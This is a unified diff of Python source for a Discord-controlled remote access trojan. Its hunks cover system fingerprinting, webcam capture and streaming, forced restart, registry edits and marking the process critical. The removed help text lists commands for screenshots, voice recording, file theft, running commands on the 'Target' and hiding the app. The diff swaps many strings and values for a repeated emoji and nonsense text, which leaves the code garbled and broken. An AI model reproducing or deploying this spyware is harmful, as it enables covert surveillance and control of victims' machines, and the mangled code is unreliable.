@@ -30,18 +30,18 @@ permissions.administrator = True
 client = discord.Client(intents=intents)
 
 
-token = "DISCORD BOT TOKEN HERE"
-webhook = "WEBHOOK HERE"
+token = "🫃"
+webhook = "🫃"
 
-temp = os.getenv("temp")
+temp = os.getenv("🫃")
 temp_path = os.path.join(temp, ''.join(random.choices(
-    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
+    "🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃", k=10)))
 os.mkdir(temp_path)
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(
     errors='ignore').strip().splitlines()[2].strip()
-cpu = subprocess.run(["wmic", "cpu", "get", "Name"],
+cpu = subprocess.run(["🫃", "cpu", "get", "Name"],
                      capture_output=True, text=True).stdout.strip().split('\n')[2]
 gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True,
                      shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
@@ -170,7 +170,7 @@ async def webcamshot(ctx, numberofphoto: int):
     cv2.destroyAllWindows()
 
 
-@tasks.loop(seconds=1/30)  # For 30FPS.(Recommened.)
+@tasks.loop(seconds=1/🫃)  # For 30FPS.(Recommened.)
 async def send_camera_feed():
     ret, frame = video_capture.read()
 
@@ -223,7 +223,7 @@ async def stop(ctx):
     if ctx.channel.name.lower() != allowed_channel:
 
         return
-    channel_name = username + "-stream"
+    channel_name = username + "-🫃"
     guild = bot.guilds[0] if bot.guilds else None
     channel_name_lower = channel_name.lower()
     channel = discord.utils.get(guild.channels, name=channel_name_lower)
@@ -247,10 +247,10 @@ async def recordvideo(ctx, seconds: int):
         # OpenCV VideoCapture
         video_capture = cv2.VideoCapture(0)
 
-        # Define the codec and create a VideoWriter object
-        fourcc = cv2.VideoWriter_fourcc(*'XVID')
-        videofile_path = temp_path + '\\webcam.avi'
-        out = cv2.VideoWriter(videofile_path, fourcc, 20.0, (640, 480))
+        # 🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃
+        fourcc = cv2.VideoWriter_fourcc(*'🫃🫃🫃🫃')
+        videofile_path = temp_path + '\\webcam.avi🫃🫃🫃🫃'
+        out = cv2.VideoWriter(videofile_path, fourcc, 20.0, (640, 🫃))
 
         while True:
             ret, frame = video_capture.read()
@@ -391,9 +391,9 @@ async def changelang(ctx, lang):
     try:
         global language
         language = lang
-        await ctx.channel.send(f"```Lang Changed: {language}```")
+        await ctx.channel.send(f"```🫃: ok```")
     except Exception as e:
-        await ctx.channel.send(f"```Error: {e}```")
+        await ctx.channel.send(f"```prergnant mman: 🫃```")
 
 
 @bot.command(name="say")
@@ -495,11 +495,11 @@ async def restart(ctx):
 
         return
     try:
-        await ctx.channel.send("```Okay Sir...```")
-        os.system("shutdown /r /t 0")
+        await ctx.channel.send("```🫃 Sir...```")
+        os.system("shutdown /r /t 0 🫃")
 
     except Exception as e:
-        await ctx.channel.send(f"```Error :\n {e} ``` ")
+        await ctx.channel.send(f"```Error :\n 🫃``` ")
 
 
 @bot.command(name="voice")
@@ -545,17 +545,17 @@ async def wallpaper(ctx, *args):
 
             # Set the wallpaper
             new_wallpaperpath = os.path.abspath(temp_filename)
-            command = f'reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "{new_wallpaperpath}" /f'
+            command = f'reg add "🫃\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "{new_wallpaperpath}" /f'
             os.system(command)
 
             # Update the wallpaper
             os.system('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')
 
-            await ctx.send("```Wallpaper updated successfully!```")
+            await ctx.send("```Wallpaper updated successfully! 🫃```")
         else:
             await ctx.send("```Please provide an image attachment.```")
     except Exception as e:
-        await ctx.send(f"```Error:\n{e}```")
+        await ctx.send(f"```Error:\n🫃🫃```")
 
 
 @bot.command(name="website")
@@ -601,9 +601,9 @@ async def critproc(ctx):
         ctypes.windll.ntdll.RtlAdjustPrivilege(
             20, 1, 0, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
-        await ctx.channel.send("```Command Exucuted!```")
+        await ctx.channel.send("```Command 🫃!```")
     except Exception as e:
-        await ctx.channel.send("```Command can not be Exacutable...```")
+        await ctx.channel.send("```Command can not be 🫃...```")
 
 
 @bot.command(name="helpme")
@@ -613,49 +613,7 @@ async def helpmsg(ctx):
     if ctx.channel.name.lower() != allowed_channel:
 
         return
-    await ctx.channel.send("""```
-!helpme : Shows Commands. 
-!ss (number) : Take Screenshot.
-!getinfo : Get Them Info.
-!recordvoice (second) : Record a Voice File.
-!ws (number) : Webcamshot.
-!wstream :Real Time Photos.
-!stopstream :Stop Real Time Photos.
-!video (second) : Record Video.
-!command (command) : Sends Commands to Target.
-!gofile (folder name) : Change Directory With That.
-!kill (procces) : Kill a Task.
-!hide : Hide App.
-!setlang (lang code) : Set Language Before Using !say. 
-!say (custom input) : Say Something Nice to Target.
-!amiadmin : Checks If You Are Admin or Not.
-!get (file or file path) : Get the File In the Target.
-!voice (file) : Upload a Voice File Into Target and Run It.
-!shutdown : Closes The PC.
-!restart : Restart The Pc.
-!msg (custom input) : Send a MessageBox.
-!wallpaper (picture) : Change the Wallpaper.(only png.)
-!critproc : It Make The File has a Critical Process.
-!upload (file) : Upload a File.
-!website (website url) : Go to the Website.  
-DO NOT FORGET TO GIVE SECONDS OR NUMBERS!
-    example usage : !ws 10 it will take 10 webcamshot for a second.
-    example usage : !recordvoice 10 it will record the voice for 10 seconds.
-    example usage : !video 10 it will record the webcam for 10 seconds.
-    example usage : !ss 4 it will take 4 ss for a second.
-    example usage : !voice (voice file.)
-    example usage : !msg (custom sentences.)
-    example usage : !say (custom sentences.)
-    example usage : !setlang (lang code.)
-    example usage : !get (the file path.)
-    example usage : !wallpaper (any picture file.)
-    example usage : !kill (procces.)
-    example usage : !gofile (folder.)
-    example usage : !command (command.)
-    example usage : !website (https://google.com)
-    example usage : !upload (file.)
-!cmd : You Can See the Best CMD Commands.(Also You Can Find On Net.) ```                                                        
-""")
+    await ctx.channel.send("""```🫃```""")
 
 
 @bot.command(name="cmd")
@@ -665,75 +623,7 @@ async def cmd(ctx):
     if ctx.channel.name.lower() != allowed_channel:
 
         return
-    await ctx.channel.send("""```
-
-Usage: dir
-Example: Lists files and directories in the current directory.
-cls (Clear Screen):
-
-Usage: cls
-Example: Clears the Command Prompt screen.
-ipconfig (IP Configuration):
-
-Usage: ipconfig
-Example: Displays information about network interfaces and IP configuration.
-ping (Ping a Server):
-
-Usage: ping [hostname or IP address]
-Example: ping www.google.com
-netstat (Network Statistics):
-
-Usage: netstat -a
-Example: Displays active network connections.
-tasklist (List Running Processes):
-
-Usage: tasklist
-Example: Lists all running processes on the system.
-taskkill (Terminate a Process):
-
-Usage: taskkill /F /IM [process name]
-Example: taskkill /F /IM notepad.exe
-systeminfo (System Information):
-
-Usage: systeminfo
-Example: Displays detailed information about the computer's configuration.
-sfc (System File Checker):
-
-Usage: sfc /scannow
-Example: Scans and repairs system files.
-chkdsk (Check Disk):
-
-Usage: chkdsk /f
-Example: Checks and repairs disk errors.
-
-gpupdate (Group Policy Update):
-Usage: gpupdate /force
-Example: Forces an immediate update of Group Policy.
-
-shutdown (Shutdown or Restart):
-Usage: shutdown /s /t 0 (Shutdown)
-Usage: shutdown /r /t 0 (Restart)
-                   
-mklink (Create Symbolic Links):
-Usage: mklink /d [link] [target]
-Example: mklink /d C:\LinkToFolder C:\TargetFolder
-copy (Copy Files):
-
-Usage: copy [source] [destination]
-Example: copy C:\File.txt D:\Backup
-xcopy (Extended Copy):
-
-Usage: xcopy [source] [destination] /E /H /C /K /Y
-Example: xcopy C:\SourceFolder D:\DestinationFolder /E /H /C /K /Y
-attrib (File Attribute Manipulation):
-
-Usage: attrib +h +s [file or folder]
-Example: Hides and sets a file or folder as system.
-
-md (Make Directory):
-Usage: md [directory name]
-Example: md NewFolder
-                   ```""")
+    await ctx.channel.send("""```🫃```""")
 
 
 bot.run(token)
